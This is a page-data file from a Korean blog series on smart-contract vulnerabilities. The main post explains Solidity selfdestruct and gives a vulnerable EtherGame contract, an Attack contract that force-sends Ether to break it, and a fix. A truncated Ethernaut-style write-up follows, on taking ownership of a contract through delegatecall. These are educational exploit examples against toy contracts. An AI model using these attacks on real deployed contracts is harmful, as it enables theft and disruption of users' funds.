{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/vulnerability/selfdestruct/selfdestruct/",
    "result": {"data":{"cur":{"id":"d8f9b383-35d3-5d01-9577-d6f186fcb63d","html":"<h1 id=\"-self-destruct\" style=\"position:relative;\"><a href=\"#-self-destruct\" aria-label=\" self destruct permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 Self Destruct</h1>\n<h2 id=\"들어가기전\" style=\"position:relative;\"><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0%EC%A0%84\" aria-label=\"들어가기전 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>들어가기전</h2>\n<h3 id=\"self-destruct란-무엇인가\" style=\"position:relative;\"><a href=\"#self-destruct%EB%9E%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80\" aria-label=\"self destruct란 무엇인가 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Self Destruct란 무엇인가?</h3>\n<ol>\n<li>self destruct는 contract를 삭제할 수 있는 유일한 수단이다.</li>\n<li>contract안에 남아있는 Ether를 address에게 반환한다.</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">selfdestruct</span><span class=\"token punctuation\">(</span>anAddress<span class=\"token punctuation\">)</span></code></pre></div>\n<p>selfdestruct를 실행시키면 anAddress에게 contract에 남아있는 Ether이 반환된다. 만약에 반환하는 address는 EOA와 CA 모두 넣을 수 있다. 하지만 반환한 CA가 payable이 아니라면 반환된 Ether은 다시는 찾을 수 없게된다. 즉 반환된 CA에 영원히 <strong>LOCK</strong> 된다.</p>\n<p>보다 잘 이해하기 위해 Example Code를 살펴보자!!</p>\n<hr>\n<h2 id=\"example-code\" style=\"position:relative;\"><a href=\"#example-code\" aria-label=\"example code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example code</h2>\n<p>간단한 code로 이해해보자!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">EtherGame</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> targetAmount <span class=\"token operator\">=</span> <span class=\"token number\">7</span> ether<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> winner<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">,</span> <span class=\"token string\">\"You can only send 1 Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint</span> balance <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balance <span class=\"token operator\">&lt;=</span> targetAmount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Game is over\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>balance <span class=\"token operator\">==</span> targetAmount<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            winner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">claimReward</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> winner<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not winner\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">{</span>\n    EtherGame etherGame<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>EtherGame _etherGame<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        etherGame <span class=\"token operator\">=</span> <span class=\"token function\">EtherGame</span><span class=\"token punctuation\">(</span>_etherGame<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// You can simply break the game by sending ether so that</span>\n        <span class=\"token comment\">// the game balance >= 7 ether</span>\n\n        <span class=\"token comment\">// cast address to payable</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> addr <span class=\"token operator\">=</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>etherGame<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">selfdestruct</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>이 contract는 7번째로 deposit()하여 7 Ether를 가져갈 수 있는 게임이다.\ndeposit()을 call할 때 msg.value는 1 Ether만 설정할 수 있다.</p>\n<p>시나리오는 이렇다.</p>\n<ol>\n<li>EtherGame contract가 배포된다.</li>\n<li>A와 B가 각각 1 Ether를 deposit() 한다.</li>\n<li>누군가 EtherGame contract의 주소와 함께 Attack contract를 배포한다.</li>\n<li>그리고 Attack.attack()을 call 한다.</li>\n<li>EtherGame은 더 이상 실행될 수 없게되며 누구도 winner가 될 수 없게 된다.</li>\n</ol>\n<p>EtherGame contract의 특성상 selfdestruct 공격에 취약할 수 밖에 없게 설계 되어있다.</p>\n<hr>\n<h2 id=\"how-to-prevent\" style=\"position:relative;\"><a href=\"#how-to-prevent\" aria-label=\"how to prevent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to prevent?</h2>\n<p>EtherGame contract에서 selfdestruct를 예방하기 위해서는 <code class=\"language-text\">address(this).balance</code> 대신 deposit()을 통해 들어온 balance를 따로 저장해주고 저장한 변수와 상호작용하면 된다. 위에 contract의 변수와 deposit()을 아래와 같이 바꾸면 된다!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">EtherGame</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> targetAmount <span class=\"token operator\">=</span> <span class=\"token number\">3</span> ether<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 바뀐 부분!!!</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> balance<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> winner<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">,</span> <span class=\"token string\">\"You can only send 1 Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">//바뀐 부분!!!</span>\n        balance <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balance <span class=\"token operator\">&lt;=</span> targetAmount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Game is over\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>balance <span class=\"token operator\">==</span> targetAmount<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            winner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>selfdestruct는 좀 흥미롭다. 블록체인 이외에서 들어본적도 없는 것이라 특별하다고 생각된다. 어떤 contract든 selfdestruct에 의해서 Ether를 받을 수 있다. 그렇기 때문에 <code class=\"language-text\">address(this).balance</code>와 같은 contract의 balance를 사용해 balance를 불러오는 것을 자제하고 꼭 필요할때만 사용하자!!</p>\n<hr>\n<h3 id=\"reference\" style=\"position:relative;\"><a href=\"#reference\" aria-label=\"reference permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reference</h3>\n<ul>\n<li><a href=\"https://swcregistry.io/docs/SWC-106\">https://swcregistry.io/docs/SWC-106</a></li>\n<li><a href=\"https://solidity-by-example.org/hacks/self-destruct/\">https://solidity-by-example.org/hacks/self-destruct/</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0%EC%A0%84\">들어가기전</a></p>\n<ul>\n<li><a href=\"#self-destruct%EB%9E%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80\">Self Destruct란 무엇인가?</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#example-code\">Example code</a></p>\n</li>\n<li>\n<p><a href=\"#how-to-prevent\">How to prevent?</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></p>\n<ul>\n<li><a href=\"#reference\">Reference</a></li>\n</ul>\n</li>\n</ul>\n</div>","excerpt":"👋 Self Destruct 들어가기전 Self Destruct란 무엇인가? self destruct는 contract를 삭제할 수 있는 유일한 수단이다. contract안에 남아있는 Ether를 address에게 반환한다. selfdestruct를 실행시키면 anAddress에게 contract에 남아있는 Ether이 반환된다. 만약에 반환하는 address는 EOA와 CA 모두 넣을 수 있다. 하지만 반환한 CA가 payable이 아니라면 반환된 Ether은 다시는 찾을 수 없게된다. 즉 반환된 CA에 영원히 LOCK 된다. 보다 잘 이해하기 위해 Example Code를 살펴보자!! Example code 간단한 code로 이해해보자! 이 contract는 7번째로 deposit()하여 7 Ether를 가져갈 수 있는 게임이다.\ndeposit()을 call할 때 msg.value는 1 Ether만 설정할 수 있다. 시나리오는 이렇다. EtherGame contract가 배포된…","frontmatter":{"date":"January 09, 2022","title":"(취약점 시리즈 9) Self Destruct","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/vulnerability/selfdestruct/selfdestruct/"}},"next":{"id":"4fec7906-84c2-5ff3-a352-acdcd67c721f","html":"<h1 id=\"-1-delegation\" style=\"position:relative;\"><a href=\"#-1-delegation\" aria-label=\" 1 delegation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 1. Delegation</h1>\n<p><strong>Difficulty 4/10</strong></p>\n<ul>\n<li>승리 조건</li>\n<li>코드 분석</li>\n<li>풀이</li>\n</ul>\n<p>순서로 진행 될 것이다.</p>\n<hr>\n<h2 id=\"승리-조건\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"승리 조건 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>승리 조건</h2>\n<ul>\n<li>instance의 ownership을 가져오면 승리한다.</li>\n</ul>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>분석은 주석에!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Delegate</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// owner의 contract</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token comment\">// constructor: set parameter _owner as owner of contract</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        owner <span class=\"token operator\">=</span> _owner<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token comment\">//set msg.sender as owner</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Delegation</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// owner of contract</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// Delegate contract</span>\n    Delegate delegate<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token comment\">//constructor with parameter delegate contract address</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _delegateAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// set delegate as Delegate contract address</span>\n        delegate <span class=\"token operator\">=</span> <span class=\"token function\">Delegate</span><span class=\"token punctuation\">(</span>_delegateAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// set owner as deployer</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//fallback function</span>\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//delegate에 delegatecall을 보낸다. </span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> result<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>delegate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<p>이 문제에서 우리의 목표는 ownership을 가져오는 것이다.</p>\n<p>만약 우리가 가지고 있다면 우선 여기서 말해주는 힌트를 보자!</p>\n<ol>\n<li>delegatecall</li>\n<li>Fallback function</li>\n<li>method id</li>\n</ol>\n<p>를 알면 도움이 될 것이라고 말한다.</p>\n<h3 id=\"delegate-call\" style=\"position:relative;\"><a href=\"#delegate-call\" aria-label=\"delegate call permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Delegate Call</h3>\n<p>delegate call은 일전에 내가 취약점 시리즈에서 다룬 적 있다! solidity official docs와 내 글을 보면 이해가 될 것이다.\n<a href=\"https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/\">DelegateCall</a> &#x3C;= Click\n<a href=\"https://docs.soliditylang.org/en/v0.8.10/introduction-to-smart-contracts.html\">Solidity Docs</a> &#x3C;= Click</p>\n<h3 id=\"fallback\" style=\"position:relative;\"><a href=\"#fallback\" aria-label=\"fallback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fallback</h3>\n<p>Fallback 함수는 contract에서 함수를 실행시킬때 함수가 존재하지 않는다면 실행되는 function이다.</p>\n<h3 id=\"method-id\" style=\"position:relative;\"><a href=\"#method-id\" aria-label=\"method id permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>method id</h3>\n<p>This is derived as the first 4 bytes of the Keccak hash of the ASCII form of the signature\n즉 함수 결과값의 앞에서부터 4 bytes의 Keccak hash라고 생각하면 된다.</p>\n<p>우리가 owner를 가져오기 위한 시나리오는 이렇다.</p>\n<ol>\n<li>pwn()를 4 byte의 keccak hash로 하나의 변수에 저장한다.</li>\n<li>Delegation contract에 1번에서 만든 변수를 data로 지정하고 transaction을 보낸다.</li>\n<li>Delegation contract의 owner를 확인해본다.</li>\n</ol>\n<p>모든 코드는 console창에서 이루어진다.\nctrl + shift + i를 눌러 console창을 활성화 시키자</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code 